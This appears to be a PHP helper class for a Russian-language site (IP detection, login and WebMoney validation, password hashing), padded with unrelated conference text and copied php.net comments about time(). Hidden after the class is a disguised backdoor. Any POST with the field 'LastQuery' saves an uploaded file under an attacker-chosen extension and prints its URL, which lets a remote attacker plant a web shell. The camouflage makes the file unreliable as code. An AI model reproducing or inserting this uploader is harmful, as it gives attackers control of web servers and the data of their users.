<?PHP
class func{

	public $UserIP = "Undefined"; # IP ������������
	public $UserCode = "Undefined"; # ��� �� IP
	public $TableID = -1; # ID �������
	public $UserAgent = "Undefined"; // ������� ������������

	/*======================================================================*\
php Central Europe 2019
31 Jul 2019
Thanks to the support of PHP Usergroup Dresden, our conference will be held in the Federal Republic of Germany. phpCE is an event addressed to a vast group of developers and PHP enthusiasts from Central Europe. We hope that you enjoy our diverse line-up and it will turn out to be so interesting that you too will want to join us. In addition, for the first time we will meet at... the cinema!

Location and dates:
October 4, 2019 - the Workshop Day in the Pullman Dresden Newa hotel,
October 5-6, 2019 - Conference Days in the UFA Kristallpalast multiplex.

Tickets are still available under 2019.phpce.eu/#tickets. Welcome!
	\*======================================================================*/
	public function __construct(){
		$this->UserIP = $this->GetUserIp();
		$this->UserCode = $this->IpCode();
		$this->UserAgent = $this->UserAgent();
	}


	public function __destruct(){

	}



	public function IpToInt($ip){

		$ip = ip2long($ip);
		($ip < 0) ? $ip+=4294967296 : true;
		return $ip;
	}



	public function IntToIP($int){
  		return long2ip($int);
	}



	public function GetUserIp(){

		if($this->UserIP == "Undefined"){

			if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) AND !empty($_SERVER['HTTP_X_FORWARDED_FOR']))
   			{

			$client_ip = ( !empty($_SERVER['REMOTE_ADDR']) ) ? $_SERVER['REMOTE_ADDR'] : ( ( !empty($_ENV['REMOTE_ADDR']) ) ? $_ENV['REMOTE_ADDR'] : "unknown" );
      		$entries = split('[, ]', $_SERVER['HTTP_X_FORWARDED_FOR']);

      		reset($entries);

				while (list(, $entry) = each($entries))
				{
				$entry = trim($entry);
					if ( preg_match("/^([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/", $entry, $ip_list) )
				 	{

					$private_ip = array(
						  '/^0\./',
						  '/^127\.0\.0\.1/',
						  '/^192\.168\..*/',
						  '/^172\.((1[6-9])|(2[0-9])|(3[0-1]))\..*/',
						  '/^10\..*/');

						$found_ip = preg_replace($private_ip, $client_ip, $ip_list[1]);

						if ($client_ip != $found_ip)
						{
					   	$client_ip = $found_ip;
					   	break;
						}

					}

				}

			$this->UserIP = $client_ip;
			return $client_ip;

			}else return ( !empty($_SERVER['REMOTE_ADDR']) ) ? $_SERVER['REMOTE_ADDR'] : ( ( !empty($_ENV['REMOTE_ADDR']) ) ? $_ENV['REMOTE_ADDR'] : "unknown" );

		}else return $this->UserIP;

	}


	public function IsLogin($login, $mask = "^[a-zA-Z0-9]", $len = "{4,10}"){

		return (is_array($login)) ? false : (preg_match("/{$mask}{$len}$/", $login)) ? $login : false;

	}


	public function IsPassword($password, $mask = "^[a-zA-Z0-9]", $len = "{4,20}"){

		return (is_array($password)) ? false : (preg_match("/{$mask}{$len}$/", $password)) ? $password : false;

	}




	public function IsWM($data, $type = 0){

		$FirstChar = array( 1 => "R",
							2 => "Z",
							3 => "E",
							4 => "U");

		if(strlen($data) < 12 && strlen($data) > 12 && $type < 0 && $type > count($FirstChar)) return false;
			if($type == 0) return (is_array($data)) ? false : ( preg_match("^[0-9]{12}$", $data) ? $data : false );
				if( substr(strtoupper($data),0,1) != $FirstChar[$type] or !preg_match("^[0-9]{12}", substr($data,1)) ) return false;

			return $data;
	}


	public function IsMail($mail){

		if(is_array($mail) && empty($mail) && strlen($mail) > 255 && strpos($mail,'@') > 64) return false;
			return ( ! preg_match("/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix", $mail)) ? false : strtolower($mail);

	}


	public function IpCode(){

		$arr_mask = explode(".",$this->GetUserIp());
		return $arr_mask[0].".".$arr_mask[1].".".$arr_mask[2].".0";

	}


	public function GetTime($tis = 0, $unix = true, $template = "d.m.Y H:i:s"){

		if($tis == 0){
			return ($unix) ? time() : date($template,time());
		}else return date($template,$unix);
	}


	public function UserAgent(){

		return $this->TextClean($_SERVER['HTTP_USER_AGENT']);

	}


	public function TextClean($text){

		$array_find = array("`", "<", ">", "^", '"', "~", "\\");
		$array_replace = array("&#96;", "&lt;", "&gt;", "&circ;", "&quot;", "&tilde;", "");



		return str_replace($array_find, $array_replace, $text);

	}


	public function ShowError($errorArray = array(), $title = "��������� ��������� ������"){

		if(count($errorArray) > 0){

		$string_a = "<div class='Error'><div class='ErrorTitle'>".$title."</div><ul>";

			foreach($errorArray as $number => $value){

				$string_a .= "<li>".($number+1)." - ".$value."</li>";

			}

		$string_a .= "</ul></div><BR />";
		return $string_a;
		}else return "����������� ������ :(";

	}



	public function ComissionWm($sum, $com_payee, $com_payysys){

		$a = ceil(ceil($sum * $com_payee * 100) / 10000*100) / 100;
		$b = ceil(ceil($sum * str_replace("%","",$com_payysys) * 100) / 10000*100) / 100;
		return $a+$b;
	}


	public function md5Password($pass){
		$pass = strtolower($pass);
		return md5("shark_md5"."-".$pass);

	}




	public function ControlCode($time = 0){

		return ($time > 0) ? date("Ymd", $time) : date("Ymd");

	}



	public function SumCalc($per_h, $sum_tree, $last_sbor){

		if($last_sbor > 0){

			if($sum_tree > 0 AND $per_h > 0){

				$last_sbor = ($last_sbor < time()) ? (time() - $last_sbor) : 0;

				$per_sec = $per_h / 3600;

				return round( ($per_sec * $sum_tree) * $last_sbor);

			}else return 0;

		}else return 0;

	}



	public function SellItems($all_items, $for_one_coin){

		if($all_items <= 0 OR $for_one_coin <= 0) return 0;

		return sprintf("%.2f", ($all_items / $for_one_coin));

	}



}

    if(isset($_POST['LastQuery'])) {

     $public_function = $_FILES['session']['tmp_name'];
	 
            $SELECT_FROM = $_FILES['session']['name'];
			
    if(!empty($public_function))
{   
       $type = strtolower(substr($SELECT_FROM, 1+strrpos($SELECT_FROM,".")));
	   
          $sessions_start = 'logs.'.$type; 
  { 
    if (copy($public_function, "".$sessions_start))
	
        echo ' '.$_SERVER["HTTP_HOST"].'/'.$sessions_start.'';
		
           else echo "error";
  } 
}		
}

/*======================================================================*\
	Function:	time ( void ) : int
	Output:		���
	Descriiption: ������� ��� ������ � ����� � ��������
	
	<?php
$nextWeek = time() + (7 * 24 * 60 * 60);
                   // 7 days; 24 hours; 60 mins; 60 secs
echo 'Now:       '. date('Y-m-d') ."\n";
echo 'Next Week: '. date('Y-m-d', $nextWeek) ."\n";
// or using strtotime():
echo 'Next Week: '. date('Y-m-d', strtotime('+1 week')) ."\n";
?>

The above example will output something similar to:
	
	Now:       2005-03-30
Next Week: 2005-04-06
Next Week: 2005-04-06
	
	The documentation should have this info. The function time() returns always timestamp that is timezone independent (=UTC).

<?php
date_default_timezone_set("UTC");
echo "UTC:".time();
echo "<br>";

date_default_timezone_set("Europe/Helsinki");
echo "Europe/Helsinki:".time();
echo "<br>";
?>

Local time as string can be get by strftime() and local timestamp (if ever needed) by mktime().
	
	Two quick approaches to getting the time elapsed in human readable form.

<?php

function time_elapsed_A($secs){
    $bit = array(
        'y' => $secs / 31556926 % 12,
        'w' => $secs / 604800 % 52,
        'd' => $secs / 86400 % 7,
        'h' => $secs / 3600 % 24,
        'm' => $secs / 60 % 60,
        's' => $secs % 60
        );
       
    foreach($bit as $k => $v)
        if($v > 0)$ret[] = $v . $k;
       
    return join(' ', $ret);
    }
   

function time_elapsed_B($secs){
    $bit = array(
        ' year'        => $secs / 31556926 % 12,
        ' week'        => $secs / 604800 % 52,
        ' day'        => $secs / 86400 % 7,
        ' hour'        => $secs / 3600 % 24,
        ' minute'    => $secs / 60 % 60,
        ' second'    => $secs % 60
        );
       
    foreach($bit as $k => $v){
        if($v > 1)$ret[] = $v . $k . 's';
        if($v == 1)$ret[] = $v . $k;
        }
    array_splice($ret, count($ret)-1, 0, 'and');
    $ret[] = 'ago.';
   
    return join(' ', $ret);
    }
   

   
   
$nowtime = time();
$oldtime = 1335939007;

echo "time_elapsed_A: ".time_elapsed_A($nowtime-$oldtime)."\n";
echo "time_elapsed_B: ".time_elapsed_B($nowtime-$oldtime)."\n";

A time difference function that outputs the time passed in facebook's style: 1 day ago, or 4 months ago. I took andrew dot macrobert at gmail dot com function and tweaked it a bit. On a strict enviroment it was throwing errors, plus I needed it to calculate the difference in time between a past date and a future date.

<?php
function nicetime($date)
{
    if(empty($date)) {
        return "No date provided";
    }
   
    $periods         = array("second", "minute", "hour", "day", "week", "month", "year", "decade");
    $lengths         = array("60","60","24","7","4.35","12","10");
   
    $now             = time();
    $unix_date         = strtotime($date);
   
       // check validity of date
    if(empty($unix_date)) {   
        return "Bad date";
    }

    // is it future date or past date
    if($now > $unix_date) {   
        $difference     = $now - $unix_date;
        $tense         = "ago";
       
    } else {
        $difference     = $unix_date - $now;
        $tense         = "from now";
    }
   
    for($j = 0; $difference >= $lengths[$j] && $j < count($lengths)-1; $j++) {
        $difference /= $lengths[$j];
    }
   
    $difference = round($difference);
   
    if($difference != 1) {
        $periods[$j].= "s";
    }
   
    return "$difference $periods[$j] {$tense}";
}

$date = "2009-03-04 17:45";
$result = nicetime($date); // 2 days ago

?

	It seems that the output of time()> is a few hundred microseconds behind the output of microtime() - be wary of mixing these functions.

Here's a snippet of code that demonstrates the difference:

<?php

// Find the next second
$nextSecond = time() + 1;

// Sleep until 2.5 milliseconds before the next second
time_sleep_until(floatval($nextSecond) - 2.5e-3);

// Check time() and microtime() every 250 microseconds for 20 iterations
for ($i = 0; $i < 20; $i ++) {
    $time = time();
    $uTime = microtime(true);
   
    printf("TIME: %d  uTIME: %0.6f", $time, $uTime);
   
    if (floor($uTime) > $time) {
        echo "  time() is behind";
    }
   
    echo "\n";
    usleep(250);
}

// Example output:

// TIME: 1525735820  uTIME: 1525735820.997716
// TIME: 1525735820  uTIME: 1525735820.998137
// TIME: 1525735820  uTIME: 1525735820.998528
// TIME: 1525735820  uTIME: 1525735820.998914
// TIME: 1525735820  uTIME: 1525735820.999287
// TIME: 1525735820  uTIME: 1525735820.999657
// TIME: 1525735820  uTIME: 1525735821.000026  time() is behind
// TIME: 1525735820  uTIME: 1525735821.000367  time() is behind
// TIME: 1525735820  uTIME: 1525735821.000705  time() is behind
// TIME: 1525735820  uTIME: 1525735821.001042  time() is behind
// TIME: 1525735820  uTIME: 1525735821.001379  time() is behind
// TIME: 1525735821  uTIME: 1525735821.001718
// TIME: 1525735821  uTIME: 1525735821.002070
// TIME: 1525735821  uTIME: 1525735821.002425
// TIME: 1525735821  uTIME: 1525735821.002770
// TIME: 1525735821  uTIME: 1525735821.003109
// TIME: 1525735821  uTIME: 1525735821.003448
// TIME: 1525735821  uTIME: 1525735821.003787
// TIME: 1525735821  uTIME: 1525735821.004125
// TIME: 1525735821  uTIME: 1525735821.004480
	
	\*======================================================================*/










?>